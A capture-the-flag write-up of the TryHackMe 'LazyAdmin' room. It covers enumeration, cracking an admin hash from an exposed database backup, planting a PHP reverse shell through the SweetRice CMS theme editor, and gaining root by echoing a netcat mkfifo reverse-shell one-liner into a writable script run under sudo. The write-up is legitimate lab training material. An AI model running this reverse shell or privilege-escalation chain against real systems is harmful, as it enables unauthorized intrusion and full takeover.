---
title:  "TryHackMe - LazyAdmin (Easy)"
description: "Easy Linux machine to practice your skills"
author: 0x5ubt13
date: 2021-01-17 14:30:00 +0000
categories: [Write-Ups]
tags: [write-up, OSCP, Pentesting, Ethical-Hacking, Password-Cracking, Easy, PHP-reverse-shell]
math: true
mermaid: true
image: /assets/images/write-ups/tryhackme/lazyadmin/lazyadmin_logo.png
---

Welcome to my second write-up, this time based on the room LazyAdmin from TryHackMe. This is the second of a series of rooms I will be covering on my personal Road to OSCP journey.

You can find the room for free in the following link: [TryHackMe - LazyAdmin](https://tryhackme.com/room/lazyadmin)

 

# Reconnaissance:

First off as usual, we run our favourite scan to see what's for us in store.

```sh
ip=10.10.115.249
ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -A -oN lazyadmin_initial.nmap -p$ports $ip
```

Since there's nothing special to see in the aggresive scan, I will paste a simplified scan, just to show port 80 and 22 are the only ones open and omitting the rest:

![Scan](/assets/images/write-ups/tryhackme/lazyadmin/scan.png)

Let's dive right into the website!

 

# Scouting Port 80:

Upon connecting, we see the dull apache welcoming page:

![Def page](/assets/images/write-ups/tryhackme/lazyadmin/def_page.png)

Looks like it's GoBuster time!

In order to find some hidden directories, a simple Gobuster's command goes like this:

`gobuster -dir -w <your wordlist> -u <the target URL>`

Since this is an easy box, I will be using a small, default list:

`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.115.249`

![GoBuster first scan](/assets/images/write-ups/tryhackme/lazyadmin/gobuster_1st_scan.png)

It looks like we have a finding: `/content/`.
If we jump in, we see again a simple default page, however this time we have more information: it's using a CMS called SweetRice.
Finding nothing else, it's time to use Gobuster again, this time adding the directory we found to the base URL:

`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.115.249/content`

![Gobuster second scan](/assets/images/write-ups/tryhackme/lazyadmin/gobuster_2nd_scan.png)

Now we are finally advancing somewhere! Let's dig into those directories see what we find.

 

# Enumerating Port 80:

I found something interesting whilst taking a peek into the `/inc` folder: an old database!

![Database found](/assets/images/write-ups/tryhackme/lazyadmin/database_found.png)
![Database found 2](/assets/images/write-ups/tryhackme/lazyadmin/database_found2.png)

We have several options now with this MySql database. One, would be to start an database service and load the backup; or we could just cat the code for a quicker, dirtier approach to avoid us some trouble if there was nothing really in there.

`cat mysql_bakup_20191129023059-1.5.1.sql`

Fortunately, there was indeed something valuable in there: the admin password hash! He was a lazy admin indeed...

![Hash found](/assets/images/write-ups/tryhackme/lazyadmin/hash_found.png)

 

# Cracking the password:

I know using Hashcat or John The Ripper is really cool, but the quickest way of cracking any hash is just throwing it against rainbow tables in the internet and pray for it to be in the database. In case these fail, we can always sweat trying to crack it, but why going through the whole process if the title of the room is "LazyAdmin"?

![Password cracked](/assets/images/write-ups/tryhackme/lazyadmin/password_cracked.png)

Well, no surprise on this one, it really was a weak password!

 

# Find Password, Use Password!

When we peeked over the database backup we found, we also saw the username "manager". Along with knowing the password, we are entitled now to try and login to the website's admin portal, located in one of the directories we enumerated with Gobuster. Enumeration matched with the login portal:

![Login](/assets/images/write-ups/tryhackme/lazyadmin/login.png)

![Admin panel](/assets/images/write-ups/tryhackme/lazyadmin/admin_panel.png)

 

# Reverse shell

Once we are inside the admin panel in the website, we start enumerating what's inside. If we take a look inside Themes, we see we can manipulate php files to configure the website's theme with them. Well, smells like php reverse shell!!

![Reverse shell prep](/assets/images/write-ups/tryhackme/lazyadmin/reverse_shell_prep.png)

We will be using Pentest Monkeys' PHP reverse shell. Only thing we have to do is setting up our tun0 IP address and listening in the port we specify.

![Modifying theme php reverse shell](/assets/images/write-ups/tryhackme/lazyadmin/modifying_theme_php_reverse_shell.png)

Now, everything is prepared. All we have to do at this point is navigating to the `_themes` directory we enumerated earlier with Gobuster and finding the php file we edited. 

Set up the listener. 
Click. 
*We are in*. 

![We are in](/assets/images/write-ups/tryhackme/lazyadmin/we_are_in.png)

 

# Privilege Escalation Phase

![Privesc prep](/assets/images/write-ups/tryhackme/lazyadmin/privesc_prep.png)

1. We try a quick `sudo -l` to check whether we can use any command as sudo with our current user... And yes!
2. We can call a perl script in the `/home/itguy/` directory without providing `sudo` password.
3. The content of `/home/itguy/backup.pl`. It's non-writable. We can see it's calling a script located in `/etc/` directory. Maybe we can write to it?
4. Taking a look at the permissions of the file, it looks like we can actually write to it and the owner is root!! Therefore, if we modify it to spawn a reverse shell in our ip, we should be able to pop a root shell. Let's try it out!

 

# Pwning the machine

Now that we know we have access to that file, let's make it call a root bash reverse shell. 

Since nano is blocked and vi or vim are missing from the system, we can use `echo` redirect to write to a file. 
My full command looks like this:
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.0.124 5556 >/tmp/f" > /etc/copy.sh
```

Then, calling the perl script will promote us to boss level on the box:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

![Pwned](/assets/images/write-ups/tryhackme/lazyadmin/pwned.png)

 


